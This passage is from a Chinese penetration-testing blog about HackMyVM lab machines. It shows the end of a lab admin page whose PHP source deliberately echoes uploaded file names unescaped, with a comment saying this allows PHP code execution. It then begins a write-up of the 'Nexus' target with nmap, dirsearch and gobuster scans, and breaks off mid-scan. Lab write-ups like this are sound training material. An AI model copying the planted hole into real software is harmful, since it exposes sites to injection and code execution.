class="hljs-title">bg</span>-<span class="hljs-title">gray</span>-800 <span class="hljs-title">p</span>-8 <span class="hljs-title">rounded</span>-<span class="hljs-title">lg</span> <span class="hljs-title">glow</span> <span class="hljs-title">mb</span>-12 <span class="hljs-title">max</span>-<span class="hljs-title">w</span>-<span class="hljs-title">md</span> <span class="hljs-title">mx</span>-<span class="hljs-title">auto</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mb</span>-6&quot;&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">label</span> <span class="hljs-title">for</span>=&quot;<span class="hljs-title">password</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">block</span> <span class="hljs-title">text</span>-<span class="hljs-title">sm</span> <span class="hljs-title">font</span>-<span class="hljs-title">medium</span> <span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-300&quot;&gt;管理员密码&lt;/<span class="hljs-title">label</span>&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">password</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">password</span>&quot; <span class="hljs-title">id</span>=&quot;<span class="hljs-title">password</span>&quot; <span class="hljs-title">required</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">mt</span>-1 <span class="hljs-title">p</span>-3 <span class="hljs-title">w</span>-<span class="hljs-title">full</span> <span class="hljs-title">bg</span>-<span class="hljs-title">gray</span>-700 <span class="hljs-title">border</span> <span class="hljs-title">border</span>-<span class="hljs-title">gray</span>-600 <span class="hljs-title">rounded</span>-<span class="hljs-title">md</span> <span class="hljs-title">text</span>-<span class="hljs-title">white</span> <span class="hljs-title">focus</span>:<span class="hljs-title">ring</span>-2 <span class="hljs-title">focus</span>:<span class="hljs-title">ring</span>-<span class="hljs-title">blue</span>-500&quot; <span class="hljs-title">placeholder</span>=&quot;请输入密码&quot;&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">button</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">w</span>-<span class="hljs-title">full</span> <span class="hljs-title">bg</span>-<span class="hljs-title">blue</span>-600 <span class="hljs-title">hover</span>:<span class="hljs-title">bg</span>-<span class="hljs-title">blue</span>-700 <span class="hljs-title">text</span>-<span class="hljs-title">white</span> <span class="hljs-title">font</span>-<span class="hljs-title">bold</span> <span class="hljs-title">py</span>-3 <span class="hljs-title">px</span>-4 <span class="hljs-title">rounded</span>-<span class="hljs-title">md</span> <span class="hljs-title">transition</span> <span class="hljs-title">duration</span>-300&quot;&gt;登录&lt;/<span class="hljs-title">button</span>&gt;</span><br><span class="hljs-class">        &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">        &lt;?<span class="hljs-title">php</span> &#125; <span class="hljs-title">else</span> </span>&#123; <span class="hljs-meta">?&gt;</span><br>        <br>        &lt;!-- 统计数据 --&gt;<br>        &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">bg</span>-<span class="hljs-title">gray</span>-800 <span class="hljs-title">p</span>-8 <span class="hljs-title">rounded</span>-<span class="hljs-title">lg</span> <span class="hljs-title">glow</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">h2</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-2<span class="hljs-title">xl</span> <span class="hljs-title">font</span>-<span class="hljs-title">semibold</span> <span class="hljs-title">text</span>-<span class="hljs-title">white</span> <span class="hljs-title">mb</span>-6&quot;&gt;反馈统计概览&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">p</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-300 <span class="hljs-title">mb</span>-4&quot;&gt;以下是用户提交的商品反馈统计数据，包含反馈总数、文件数量及存储占用情况。所有反馈文件可在&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>=&quot;<span class="hljs-title">uploads</span>/&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">blue</span>-500 <span class="hljs-title">hover</span>:<span class="hljs-title">underline</span>&quot;&gt;反馈档案目录&lt;/<span class="hljs-title">a</span>&gt;中查看。&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">            &lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">            $<span class="hljs-title">upload_dir</span> = <span class="hljs-title">__DIR__</span> . &#x27;/<span class="hljs-title">uploads</span>/&#x27;;</span><br><span class="hljs-class">            $<span class="hljs-title">metadata_file</span> = $<span class="hljs-title">upload_dir</span> . &#x27;<span class="hljs-title">feedbacks</span>.<span class="hljs-title">json</span>&#x27;;</span><br><span class="hljs-class">            </span><br><span class="hljs-class">            // 统计反馈总数</span><br><span class="hljs-class">            $<span class="hljs-title">total_feedbacks</span> = 0;</span><br><span class="hljs-class">            $<span class="hljs-title">user_counts</span> = [];</span><br><span class="hljs-class">            $<span class="hljs-title">product_counts</span> = [];</span><br><span class="hljs-class">            <span class="hljs-title">if</span> (<span class="hljs-title">file_exists</span>($<span class="hljs-title">metadata_file</span>)) </span>&#123;<br>                <span class="hljs-variable">$feedbacks</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$metadata_file</span>), <span class="hljs-literal">true</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$feedbacks</span>)) &#123;<br>                    <span class="hljs-variable">$total_feedbacks</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$feedbacks</span>);<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$feedbacks</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$fb</span>) &#123;<br>                        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$fb</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>                        <span class="hljs-variable">$product</span> = <span class="hljs-variable">$fb</span>[<span class="hljs-string">&#x27;product&#x27;</span>];<br>                        <span class="hljs-variable">$user_counts</span>[<span class="hljs-variable">$username</span>] = (<span class="hljs-variable">$user_counts</span>[<span class="hljs-variable">$username</span>] ?? <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br>                        <span class="hljs-variable">$product_counts</span>[<span class="hljs-variable">$product</span>] = (<span class="hljs-variable">$product_counts</span>[<span class="hljs-variable">$product</span>] ?? <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-yellow-400 text-center error-message mb-4&quot;&gt;无法解析反馈数据！&lt;/p&gt;&#x27;</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;p class=&quot;text-yellow-400 text-center error-message mb-4&quot;&gt;反馈数据文件不存在！&lt;/p&gt;&#x27;</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 新统计面板，遍历目录并渲染文件名（不做转义，允许php代码执行）</span><br>            <span class="hljs-variable">$file_count</span> = <span class="hljs-number">0</span>;<br>            <span class="hljs-variable">$total_size</span> = <span class="hljs-number">0</span>;<br>            <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-variable">$upload_dir</span> . <span class="hljs-string">&#x27;*.txt&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;bg-gray-700 p-6 rounded-md mb-8&quot;&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2 class=&quot;text-xl font-bold text-blue-400 mb-4&quot;&gt;反馈文件列表&lt;/h2&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;table class=&quot;min-w-full text-left text-gray-200&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th class=&quot;py-2&quot;&gt;文件名&lt;/th&gt;&lt;th class=&quot;py-2&quot;&gt;大小&lt;/th&gt;&lt;th class=&quot;py-2&quot;&gt;操作&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>                <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$file</span>);<br>                <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>);<br>                <span class="hljs-variable">$file_count</span>++;<br>                <span class="hljs-variable">$total_size</span> += <span class="hljs-variable">$size</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;py-1 px-2 border-b&quot;&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/td&gt;&lt;td class=&quot;py-1 px-2 border-b&quot;&gt;&#x27;</span> . <span class="hljs-variable">$size</span> . <span class="hljs-string">&#x27; B&lt;/td&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td class=&quot;py-1 px-2 border-b&quot;&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form method=&quot;POST&quot; style=&quot;display:inline&quot; onsubmit=&quot;return confirm(\&#x27;确定要删除此文件吗？\&#x27;);&quot;&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;delete_file&quot; value=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;button type=&quot;submit&quot; class=&quot;text-red-400 hover:text-red-600 underline&quot;&gt;删除&lt;/button&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/tbody&gt;&lt;/table&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div class=&quot;mt-4 text-blue-300&quot;&gt;总文件数: &#x27;</span> . <span class="hljs-variable">$file_count</span> . <span class="hljs-string">&#x27;，总大小: &#x27;</span> . (<span class="hljs-variable">$total_size</span> &gt; <span class="hljs-number">1024</span> ? <span class="hljs-title function_ invoke__">number_format</span>(<span class="hljs-variable">$total_size</span>/<span class="hljs-number">1024</span>,<span class="hljs-number">1</span>).<span class="hljs-string">&#x27; KB&#x27;</span> : <span class="hljs-variable">$total_size</span>.<span class="hljs-string">&#x27; B&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h3 class=&quot;text-lg font-semibold text-blue-400 mb-2&quot;&gt;用户反馈统计&lt;/h3&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;ul class=&quot;list-disc list-inside text-gray-200 mb-4&quot;&gt;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$user_counts</span>) === <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;暂无数据&lt;/li&gt;&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$user_counts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span> =&gt; <span class="hljs-variable">$count</span>) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$user</span>) . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$count</span> . <span class="hljs-string">&#x27; 条反馈&lt;/li&gt;&#x27;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/ul&gt;&#x27;</span>;<br><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h3 class=&quot;text-lg font-semibold text-blue-400 mb-2&quot;&gt;商品反馈统计&lt;/h3&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;ul class=&quot;list-disc list-inside text-gray-200&quot;&gt;&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$product_counts</span>) === <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;暂无数据&lt;/li&gt;&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$product_counts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$product</span> =&gt; <span class="hljs-variable">$count</span>) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$product</span>) . <span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$count</span> . <span class="hljs-string">&#x27; 条反馈&lt;/li&gt;&#x27;</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/ul&gt;&#x27;</span>;<br>            <span class="hljs-meta">?&gt;</span><br>        &lt;/div&gt;<br>        <span class="hljs-meta">&lt;?php</span> &#125; <span class="hljs-meta">?&gt;</span><br>    &lt;/div&gt;<br><br>    &lt;footer <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">text</span>-<span class="hljs-title">center</span> <span class="hljs-title">text</span>-<span class="hljs-title">gray</span>-400 <span class="hljs-title">text</span>-<span class="hljs-title">sm</span> <span class="hljs-title">mt</span>-12 <span class="hljs-title">py</span>-6&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">p</span>&gt;© 2025 星际商城 | 管理员专用&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">footer</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">// 删除文件处理（必须在任何输出前）</span><br><span class="hljs-class"><span class="hljs-title">if</span> (<span class="hljs-title">isset</span>($<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">logged_in</span>&#x27;]) &amp;&amp; $<span class="hljs-title">_SESSION</span>[&#x27;<span class="hljs-title">logged_in</span>&#x27;] === <span class="hljs-title">true</span> &amp;&amp; <span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">delete_file</span>&#x27;])) </span>&#123;<br>    <span class="hljs-variable">$upload_dir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>;<br>    <span class="hljs-variable">$metadata_file</span> = <span class="hljs-variable">$upload_dir</span> . <span class="hljs-string">&#x27;feedbacks.json&#x27;</span>;<br>    <span class="hljs-variable">$del_file</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;delete_file&#x27;</span>]);<br>    <span class="hljs-variable">$del_path</span> = <span class="hljs-variable">$upload_dir</span> . <span class="hljs-variable">$del_file</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$del_path</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$del_file</span>, <span class="hljs-string">&#x27;.txt&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$del_path</span>);<br>        <span class="hljs-comment">// 同步删除 feedbacks.json 中的记录</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$metadata_file</span>)) &#123;<br>            <span class="hljs-variable">$feedbacks</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$metadata_file</span>), <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$feedbacks</span>)) &#123;<br>                <span class="hljs-variable">$feedbacks</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$feedbacks</span>, function(<span class="hljs-variable">$fb</span>) <span class="hljs-keyword">use</span> ($<span class="hljs-title">del_file</span>) &#123;<br>                    <span class="hljs-title">return</span> $<span class="hljs-title">fb</span>[&#x27;<span class="hljs-title">filename</span>&#x27;] !== $<span class="hljs-title">del_file</span>;<br>                &#125;);<br>                <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$metadata_file</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$feedbacks</span>), JSON_PRETTY_PRINT));<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 删除后刷新页面，防止重复提交</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 页面主内容输出完毕后再生成静态页面</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;logged_in&#x27;</span>] === <span class="hljs-literal">true</span>) &#123;<br>    <span class="hljs-variable">$page_content</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/admin.html&#x27;</span>, <span class="hljs-variable">$page_content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;display:none&quot; id=&quot;static-tip&quot;&gt;[debug] 静态页面已生成&lt;/div&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>HVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Nexus</title>
    <link href="/2025/06/12/HackMyVM-Nexus/"/>
    <url>/2025/06/12/HackMyVM-Nexus/</url>
    
    <content type="html"><![CDATA[<p>入门sql靶机。</p><p>靶机IP：192.168.56.118</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><p>nmap：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.118    <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-11 22:47 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 22:47<br>Completed NSE at 22:47, 0.00s elapsed<br>Initiating NSE at 22:47<br>Completed NSE at 22:47, 0.00s elapsed<br>Initiating NSE at 22:47<br>Completed NSE at 22:47, 0.00s elapsed<br>Initiating Ping Scan at 22:47<br>Scanning 192.168.56.118 [4 ports]<br>Completed Ping Scan at 22:47, 0.02s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 22:47<br>Completed Parallel DNS resolution of 1 host. at 22:47, 0.02s elapsed<br>Initiating SYN Stealth Scan at 22:47<br>Scanning 192.168.56.118 [1000 ports]<br>Discovered open port 22/tcp on 192.168.56.118<br>Discovered open port 80/tcp on 192.168.56.118<br>Completed SYN Stealth Scan at 22:48, 7.88s elapsed (1000 total ports)<br>Initiating Service scan at 22:48<br>Scanning 2 services on 192.168.56.118<br>Completed Service scan at 22:48, 6.03s elapsed (2 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.118<br>Retrying OS detection (try #2) against 192.168.56.118<br>Initiating Traceroute at 22:48<br>Completed Traceroute at 22:48, 0.02s elapsed<br>Initiating Parallel DNS resolution of 2 hosts. at 22:48<br>Completed Parallel DNS resolution of 2 hosts. at 22:48, 0.04s elapsed<br>NSE: Script scanning 192.168.56.118.<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 5.04s elapsed<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.01s elapsed<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.00s elapsed<br>Nmap scan report for 192.168.56.118<br>Host is up (0.0013s latency).<br>Not shown: 998 filtered tcp ports (no-response)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 48:42:7a:cf:38:19:20:86:ea:fd:50:88:b8:64:36:46 (ECDSA)<br>|_  256 9d:3d:85:29:8d:b0:77:d8:52:c2:81:bb:e9:54:d4:21 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>| http-methods: <br>|_  Supported Methods: HEAD GET POST OPTIONS<br>|_http-server-header: Apache/2.4.62 (Debian)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (97%), Linux 3.2 (96%), Linux 4.4 (94%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (92%), VMware Player virtual NAT device (92%), Microsoft Windows XP SP3 (91%), BlueArc Titan 2100 NAS device (91%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network Distance: 2 hops<br>TCP Sequence Prediction: Difficulty=257 (Good luck!)<br>IP ID Sequence Generation: Incremental<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 22/tcp)<br>HOP RTT     ADDRESS<br>1   1.01 ms 192.168.21.2<br>2   1.47 ms 192.168.56.118<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.00s elapsed<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.00s elapsed<br>Initiating NSE at 22:48<br>Completed NSE at 22:48, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 23.02 seconds<br>           Raw packets sent: 2072 (94.548KB) | Rcvd: 381 (16.092KB)<br></code></pre></td></tr></table></figure><p>dirsearch：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"> dirsearch -u 192.168.56.118<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/_192.168.56.118/_25-06-11_22-48-38.txt<br><br>Target: http://192.168.56.118/<br><br>[22:48:40] Starting:                                                                                                                                       <br>[22:48:40] 403 -  279B  - /.ht_wsr.txt                                      <br>[22:48:40] 403 -  279B  - /.htaccess.bak1                                   <br>[22:48:40] 403 -  279B  - /.htaccess.orig                                   <br>[22:48:40] 403 -  279B  - /.htaccess.sample<br>[22:48:40] 403 -  279B  - /.htaccess.save<br>[22:48:40] 403 -  279B  - /.htaccess_orig                                   <br>[22:48:40] 403 -  279B  - /.htaccessOLD2<br>[22:48:40] 403 -  279B  - /.htaccess_extra<br>[22:48:40] 403 -  279B  - /.htaccessBAK<br>[22:48:40] 403 -  279B  - /.htaccessOLD<br>[22:48:40] 403 -  279B  - /.htaccess_sc<br>[22:48:40] 403 -  279B  - /.htm                                             <br>[22:48:40] 403 -  279B  - /.html                                            <br>[22:48:40] 403 -  279B  - /.htpasswd_test                                   <br>[22:48:40] 403 -  279B  - /.httr-oauth<br>[22:48:40] 403 -  279B  - /.htpasswds                                       <br>[22:48:41] 403 -  279B  - /.php                                             <br>[22:48:52] 200 -   13KB - /index2.php                                       <br>[22:48:53] 200 -  241B  - /login.php                                        <br>[22:48:58] 403 -  279B  - /server-status                                    <br>[22:48:58] 403 -  279B  - /server-status/ <br></code></pre></td></tr></table></figure><p>gobuster：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">gobuster dir  -u http://192.168.56.118:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer 